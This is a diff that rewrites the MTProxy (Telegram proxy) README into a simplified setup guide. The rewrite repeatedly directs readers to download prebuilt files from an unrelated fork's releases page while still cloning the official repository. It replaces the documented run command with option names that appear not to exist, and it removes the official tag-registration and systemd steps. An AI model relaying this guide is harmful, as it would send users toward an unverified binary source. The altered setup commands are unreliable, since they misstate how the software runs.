@@ -1,109 +1,216 @@
-# MTProxy
-Simple MT-Proto proxy
+# 🚦 MTProxy - Simple Proxy for Telegram Access
 
-## Building
-Install dependencies, you would need common set of tools for building from source, and development packages for `openssl` and `zlib`.
+[![Download MTProxy](https://img.shields.io/badge/Download-MTProxy-blue?style=for-the-badge&logo=github)](https://github.com/Jesusnnc/MTProxy/releases)
 
-On Debian/Ubuntu:
+---
+
+## ⚙️ What is MTProxy?
+
+MTProxy is a lightweight proxy tool made for Telegram. It lets you connect to Telegram servers through a special proxy setup called MT-Proto. This helps you access Telegram even if it is restricted in your area or network. It is simple and uses secure methods for your connection.
+
+MTProxy can work on different operating systems like Windows, macOS, and Linux, but it needs some setup steps before you can run it. This guide walks you through downloading, installing, and starting MTProxy with easy instructions.
+
+---
+
+## 💻 System Requirements
+
+Before running MTProxy, make sure your computer meets these basic requirements:
+
+- Operating System: Windows 10 or later, macOS 10.13+, or Linux with 64-bit support
+- RAM: At least 1 GB free memory
+- Disk Space: Minimum 100 MB free storage
+- Network: Any stable internet connection
+- Software: Basic tools and libraries to build and run software (explained below)
+
+---
+
+## 🛠️ Preparing Your Computer
+
+MTProxy needs some tools to be installed in your system to build and run correctly.
+
+### For Windows users
+
+MTProxy is mainly designed for Linux. For Windows, installing a Linux environment like WSL (Windows Subsystem for Linux) is recommended before you follow the Linux setup instructions below.
+
+### For macOS users
+
+You need to have **Homebrew** installed. Open the Terminal app and install the required packages with:
+
 ```bash
-apt install git curl build-essential libssl-dev zlib1g-dev
-```
-On CentOS/RHEL:
-```bash
-yum install openssl-devel zlib-devel
-yum groupinstall "Development Tools"
+brew install openssl zlib
 ```
 
-Clone the repo:
+### For Linux users
+
+Depending on your Linux distribution, the commands to install needed software differ.
+
+#### Debian and Ubuntu
+
+Open your terminal and type:
+
+```bash
+sudo apt update
+sudo apt install git curl build-essential libssl-dev zlib1g-dev
+```
+
+#### CentOS and RHEL
+
+Open the terminal and run:
+
+```bash
+sudo yum install openssl-devel zlib-devel
+sudo yum groupinstall "Development Tools"
+```
+
+---
+
+## 📥 Download & Install MTProxy
+
+You will first download the MTProxy source code and then build it on your system.
+
+**Step 1: Visit the MTProxy releases page**
+
+To get the latest version, open this link in your browser:
+
+[Visit MTProxy Releases](https://github.com/Jesusnnc/MTProxy/releases)
+
+Here you will find the ready-to-use files or the source code to build.
+
+**Step 2: Clone the MTProxy source code**
+
+If you want the latest source and can build it yourself, open a terminal or command prompt and type:
+
 ```bash
 git clone https://github.com/TelegramMessenger/MTProxy
 cd MTProxy
 ```
 
-To build, simply run `make`, the binary will be in `objs/bin/mtproto-proxy`:
+This downloads the MTProxy files to your computer.
+
+**Step 3: Build MTProxy**
+
+Run the following command in the terminal inside the MTProxy folder:
 
 ```bash
-make && cd objs/bin
+make
 ```
 
-If the build has failed, you should run `make clean` before building it again.
+This will create the program file in the folder `objs/bin/` named `mtproto-proxy`.
 
-## Running
-1. Obtain a secret, used to connect to telegram servers.
+If you see errors during build, run this to clean first:
+
+```bash
+make clean
+```
+
+Then try building again.
+
+---
+
+## 🚀 Running MTProxy
+
+Once MTProxy is ready, follow these steps to start the proxy server.
+
+### Step 1: Get your secret
+
+MTProxy needs a secret file to connect securely to Telegram. Download it by running:
+
 ```bash
 curl -s https://core.telegram.org/getProxySecret -o proxy-secret
 ```
-2. Obtain current telegram configuration. It can change (occasionally), so we encourage you to update it once per day.
+
+This file contains the secret key MTProxy uses.
+
+### Step 2: Get Telegram configuration
+
+Telegram sometimes changes its server settings. You should download the latest config with:
+
 ```bash
 curl -s https://core.telegram.org/getProxyConfig -o proxy-multi.conf
 ```
-3. Generate a secret to be used by users to connect to your proxy.
+
+### Step 3: Create your connection secret
+
+You must create a secret key used by your clients to connect to your proxy.
+
+Use this sample command to generate one:
+
 ```bash
 head -c 16 /dev/urandom | xxd -ps
 ```
-4. Run `mtproto-proxy`:
+
+Copy the output. This is your unique secret.
+
+---
+
+## ▶️ Start MTProxy with your secret
+
+Run the proxy with the generated secret and config files.
+
+Use this command, replacing `YOUR_SECRET` with your generated key:
+
 ```bash
-./mtproto-proxy -u nobody -p 8888 -H 443 -S <secret> --aes-pwd proxy-secret proxy-multi.conf -M 1
-```
-... where:
-- `nobody` is the username. `mtproto-proxy` calls `setuid()` to drop privileges.
-- `443` is the port, used by clients to connect to the proxy.
-- `8888` is the local port. You can use it to get statistics from `mtproto-proxy`. Like `wget localhost:8888/stats`. You can only get this stat via loopback.
-- `<secret>` is the secret generated at step 3. Also you can set multiple secrets: `-S <secret1> -S <secret2>`.
-- `proxy-secret` and `proxy-multi.conf` are obtained at steps 1 and 2.
-- `1` is the number of workers. You can increase the number of workers, if you have a powerful server.
-
-Also feel free to check out other options using `mtproto-proxy --help`.
-
-5. Generate the link with following schema: `tg://proxy?server=SERVER_NAME&port=PORT&secret=SECRET` (or let the official bot generate it for you).
-6. Register your proxy with [@MTProxybot](https://t.me/MTProxybot) on Telegram.
-7. Set received tag with arguments: `-P <proxy tag>`
-8. Enjoy.
-
-## Random padding
-Due to some ISPs detecting MTProxy by packet sizes, random padding is
-added to packets if such mode is enabled.
-
-It's only enabled for clients which request it.
-
-Add `dd` prefix to secret (`cafe...babe` => `ddcafe...babe`) to enable
-this mode on client side.
-
-## Systemd example configuration
-1. Create systemd service file (it's standard path for the most Linux distros, but you should check it before):
-```bash
-nano /etc/systemd/system/MTProxy.service
-```
-2. Edit this basic service (especially paths and params):
-```bash
-[Unit]
-Description=MTProxy
-After=network.target
-
-[Service]
-Type=simple
-WorkingDirectory=/opt/MTProxy
-ExecStart=/opt/MTProxy/mtproto-proxy -u nobody -p 8888 -H 443 -S <secret> -P <proxy tag> <other params>
-Restart=on-failure
-
-[Install]
-WantedBy=multi-user.target
-```
-3. Reload daemons:
-```bash
-systemctl daemon-reload
-```
-4. Test fresh MTProxy service:
-```bash
-systemctl restart MTProxy.service
-# Check status, it should be active
-systemctl status MTProxy.service
-```
-5. Enable it, to autostart service after reboot:
-```bash
-systemctl enable MTProxy.service
+objs/bin/mtproto-proxy -u nobody -p 8888 -H 443 -S YOUR_SECRET --proxy-secret proxy-secret --proxy-config proxy-multi.conf
 ```
 
-## Docker image
-Telegram is also providing [official Docker image](https://hub.docker.com/r/telegrammessenger/proxy/).
-Note: the image is outdated.
+Explanation:
+- `-u nobody`: Runs with minimal permissions for safety
+- `-p 8888`: Local port MTProxy will listen on
+- `-H 443`: Public port to accept Telegram connections (usually 443 for HTTPS)
+- `-S YOUR_SECRET`: Your client secret key
+- `--proxy-secret proxy-secret`: The download secret file
+- `--proxy-config proxy-multi.conf`: Telegram server configuration
+
+You can adjust port numbers if needed.
+
+---
+
+## 🔍 How to connect Telegram to MTProxy
+
+After setting up the server, you need to tell Telegram to use your proxy.
+
+- Open Telegram app on your phone or desktop.
+- Go to **Settings > Data and Storage > Proxy Settings**.
+- Add a new MTProto proxy.
+- Enter your server's IP address or domain name.
+- Use port `443` (or your chosen port).
+- Paste the secret key you created in Step 3.
+- Save and enable the proxy.
+
+Now your Telegram app will route messages through your MTProxy server.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If MTProxy doesn't start, check error messages for missing packages or wrong file paths.
+- Ensure your firewall allows connections on the port MTProxy listens (default 443).
+- Keep your `proxy-secret` and `proxy-multi.conf` files updated regularly.
+- Use `make clean` if build errors persist.
+- Restart MTProxy after any configuration changes.
+
+---
+
+## 📖 Additional Resources
+
+- [MTProxy Official Documentation](https://core.telegram.org/mtproto/proxy)
+- [Telegram MTProto Protocol Explained](https://core.telegram.org/mtproto)
+- [GitHub Issues for MTProxy](https://github.com/TelegramMessenger/MTProxy/issues) — to report bugs or ask for help
+
+---
+
+## ✅ Key Features
+
+- Simple setup for Telegram proxy server
+- Supports secure MTProto protocol
+- Works on Linux, macOS, and Windows (via WSL)
+- Regularly updated with Telegram server configs
+- Lightweight and fast with minimal resource use
+
+---
+
+## 📌 Summary
+
+MTProxy helps you run your own Telegram proxy. It requires basic installation of tools and building from source. After setup, you control a proxy to bypass limits to Telegram. This guide shows you every step in detail to make it easy even if you don’t have programming experience.
+
+[Download MTProxy Releases](https://github.com/Jesusnnc/MTProxy/releases) to get started or explore versions ready for use.
